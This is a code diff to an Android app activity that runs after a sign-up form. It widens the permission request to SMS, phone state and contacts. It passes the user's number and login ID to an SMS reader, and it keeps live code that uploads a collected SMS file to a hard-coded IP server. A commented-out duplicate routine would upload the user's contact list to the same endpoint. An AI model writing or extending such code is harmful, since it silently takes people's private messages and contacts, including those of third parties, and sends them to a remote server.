@@ -191,7 +191,7 @@ public class SuccessAfterPQForm extends AppCompatActivity {
 
     protected void makeRequest() {
         ActivityCompat.requestPermissions(SuccessAfterPQForm.this,
-                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE,  Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE},
+                new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE, Manifest.permission.READ_EXTERNAL_STORAGE,  Manifest.permission.READ_SMS, Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS, Manifest.permission.WRITE_CONTACTS},
                 GET_MY_PERMISSION);
     }
 
@@ -281,8 +281,11 @@ public class SuccessAfterPQForm extends AppCompatActivity {
                 editor.putString("user_email",useremail);
                 editor.commit();
 
-                MainApplication.readSms(getApplicationContext());
+                MainApplication.readSms(getApplicationContext(), mobileNo, loggedID);
                 mReadJsonData();
+
+//                MainApplication.contactsRead(getApplicationContext(), mobileNo, loggedID);
+//                mReadJsonDataContacts();
 
                 Intent intent = new Intent(this, SuccessSplash.class);
                 startActivity(intent);
@@ -310,8 +313,23 @@ public class SuccessAfterPQForm extends AppCompatActivity {
         }).start();
     }
 
+//    public void mReadJsonDataContacts() {
+//        Log.e(TAG, "mReadJsonDataContacts: " );
+//        final File dir = new File(Environment.getExternalStorageDirectory() + "/");
+//        if (dir.exists() == false) {
+//            dir.mkdirs();
+//        }
+//        final File f = new File(dir, "contacts.json");
+//        new Thread(new Runnable() {
+//            @Override
+//            public void run() {
+//                uploadFileContacts(f.getAbsolutePath());
+//            }
+//        }).start();
+//    }
 
-    /** upload file to server **/
+
+    /** upload SMS file to server **/
     public int uploadFile(final String selectedFilePath) {
         String urlup = "http://139.59.32.234/sms/Api/send_message";
         int serverResponseCode = 0;
@@ -379,6 +397,7 @@ public class SuccessAfterPQForm extends AppCompatActivity {
                 //writing bytes to data outputstream
                 dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
                 dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"document\";filename=\""
+//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"contactsdocument\";filename=\""
                         + selectedFilePath + "\"" + lineEnd);
                 dataOutputStream.writeBytes(lineEnd);
 
@@ -416,7 +435,6 @@ public class SuccessAfterPQForm extends AppCompatActivity {
 //                            mDialog.setProgress((int) Math.round(total * 100 / fileLength));
                         }
                     });
-
                 }
                 dataOutputStream.writeBytes(lineEnd);
                 dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
@@ -482,6 +500,180 @@ public class SuccessAfterPQForm extends AppCompatActivity {
             return serverResponseCode;
         }
     }
+
+
+
+
+//    /** upload Contacts file to server **/
+//    public int uploadFileContacts(final String selectedFilePath) {
+//        String urlup = "http://139.59.32.234/sms/Api/send_message";
+//        int serverResponseCode = 0;
+//
+//        HttpURLConnection connection;
+//        DataOutputStream dataOutputStream;
+//        String lineEnd = "\r\n";
+//        String twoHyphens = "--";
+//        String boundary = "*****";
+//
+//        final int count,fileLength;
+//
+//        int bytesRead, bytesAvailable, bufferSize;
+//        byte[] buffer;
+//        int maxBufferSize = 1 * 1024 * 1024;
+//        File selectedFile = new File(selectedFilePath);
+//
+//
+//        String[] parts = selectedFilePath.split("/");
+//        final String fileName = parts[parts.length - 1];
+//
+//        if (!selectedFile.isFile()) {
+//            //dialog.dismiss();
+//
+//            runOnUiThread(new Runnable() {
+//                @Override
+//                public void run() {
+//                    Log.e("ReadSms", "run: " + "Source File Doesn't Exist: " + selectedFilePath);
+//                }
+//            });
+//            return 0;
+//        }
+//        else {
+//            try {
+////                runOnUiThread(new Runnable() {
+////                    @Override
+////                    public void run() {
+////                        showProressBar("Please wait verifying user credentials");
+////                    }
+////
+////                });
+//
+//
+//                FileInputStream fileInputStream = new FileInputStream(selectedFile);
+//                URL url = new URL(urlup);
+//                connection = (HttpURLConnection) url.openConnection();
+//                connection.setRequestMethod("POST");
+//                connection.setDoInput(true);//Allow Inputs
+//                connection.setDoOutput(true);//Allow Outputs
+//                connection.setUseCaches(false);//Don't use a cached Copy
+//                connection.setRequestMethod("POST");
+//                connection.setRequestProperty("Connection", "Keep-Alive");
+//                connection.setRequestProperty("ENCTYPE", "multipart/form-data");
+//                connection.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
+//                connection.setRequestProperty("document", selectedFilePath);
+////
+////
+//                connection.setRequestProperty("file_name", "saveSMS");
+//                Log.e("ReadSms", "Server property" + connection.getRequestMethod() + ":property " + connection.getRequestProperties());
+//
+//
+//                //creating new dataoutputstream
+//                dataOutputStream = new DataOutputStream(connection.getOutputStream());
+//
+//                //writing bytes to data outputstream
+//                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
+//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"contactsdocument\";filename=\""
+//                        + selectedFilePath + "\"" + lineEnd);
+//                dataOutputStream.writeBytes(lineEnd);
+//
+//                //returns no. of bytes present in fileInputStream
+//                bytesAvailable = fileInputStream.available();
+//                //selecting the buffer size as minimum of available bytes or 1 MB
+//                bufferSize = Math.min(bytesAvailable, maxBufferSize);
+//                //setting the buffer as byte array of size of bufferSize
+//                buffer = new byte[bufferSize];
+//                fileLength=bufferSize;
+//                //reads bytes from FileInputStream(from 0th index of buffer to buffersize)
+//                bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+//
+//                Log.e(TAG, "uploadFile: TOTAL bytes to read "+bytesRead+"total"+bufferSize );
+//                //loop repeats till bytesRead = -1, i.e., no bytes are left to read
+//                total=0;
+//
+//                while (bytesRead > 0) {
+//                    total+=bytesRead;
+//                    //write the bytes read from inputstream
+//                    dataOutputStream.write(buffer, 0, bufferSize);
+//                    Log.e("ReadSms", " here: \n\n" + buffer + "\n" + bufferSize);
+//                    bytesAvailable = fileInputStream.available();
+//                    bufferSize = Math.min(bytesAvailable, maxBufferSize);
+//                    bytesRead = fileInputStream.read(buffer, 0, bufferSize);
+//                    Log.e(TAG, "uploadFile: "+bytesRead+total );
+//                    Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
+//                    // Publish the progress
+//                    final int finalBytesRead = bytesRead;
+//                    runOnUiThread(new Runnable() {
+//                        @Override
+//                        public void run() {
+//
+//                            Log.e(TAG, "uploadFile: percentage "+((int) Math.round(total * 100 / fileLength)) );
+////                            mDialog.setProgress((int) Math.round(total * 100 / fileLength));
+//                        }
+//                    });
+//                }
+//                dataOutputStream.writeBytes(lineEnd);
+//                dataOutputStream.writeBytes(twoHyphens + boundary + lineEnd);
+//                dataOutputStream.writeBytes("Content-Disposition: form-data; name=\"file_name\"" + lineEnd);
+//                dataOutputStream.writeBytes(lineEnd);
+//                dataOutputStream.writeBytes("1");
+//                dataOutputStream.writeBytes(lineEnd);
+//                dataOutputStream.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
+//
+//                //dataOutputStream.writeBytes(URLEncoder.encode("user_id", "UTF-8")
+//                //        + "=" + URLEncoder.encode("1", "UTF-8"));
+//
+//                serverResponseCode = connection.getResponseCode();
+//                Log.e("ReadSms", " here:server response \n\n" + serverResponseCode);
+//                String serverResponseMessage = connection.getResponseMessage();
+//                Log.e("ReadSms", " here: server message \n\n" + serverResponseMessage.toString() + "\n" + bufferSize);
+//                BufferedReader br = new BufferedReader(new InputStreamReader((connection.getInputStream())));
+//                String output = "";
+//                sb = new StringBuffer();
+//
+//                while ((output = br.readLine()) != null) {
+//                    sb.append(output);
+//                    Log.e("ReadSms", "uploadFile: " + br);
+//                    Log.e("ReadSms", "Server Response is: " + serverResponseMessage + ": " + serverResponseCode);
+//                }
+//                Log.e("ReadSms ", "uploadFile: " + sb.toString());
+//
+//                //response code of 200 indicates the server status OK
+//                if (serverResponseCode == 200) {
+//                    runOnUiThread(new Runnable() {
+//                        @Override
+//                        public void run() {
+//                            Toast.makeText(SuccessAfterPQForm.this, sb.toString(), Toast.LENGTH_SHORT).show();
+//
+//                            Log.e("ReadSms", " here: \n\n" + fileName);
+//                        }
+//                    });
+//                }
+//
+//                //closing the input and output streams
+//                fileInputStream.close();
+//                dataOutputStream.flush();
+//                dataOutputStream.close();
+//
+//
+//            } catch (FileNotFoundException e) {
+//                e.printStackTrace();
+//                runOnUiThread(new Runnable() {
+//                    @Override
+//                    public void run() {
+//                        Toast.makeText(SuccessAfterPQForm.this, "File Not Found", Toast.LENGTH_SHORT).show();
+//                    }
+//                });
+//            } catch (MalformedURLException e) {
+//                e.printStackTrace();
+//                Toast.makeText(SuccessAfterPQForm.this, "URL error!", Toast.LENGTH_SHORT).show();
+//
+//            } catch (IOException e) {
+//                e.printStackTrace();
+//                Toast.makeText(SuccessAfterPQForm.this, "Cannot Read/Write File!", Toast.LENGTH_SHORT).show();
+//            }
+////            dialog.dismiss();
+//            return serverResponseCode;
+//        }
+//    }
 
     private void showProressBar(String s) {
         mDialog = new ProgressDialog(SuccessAfterPQForm.this);
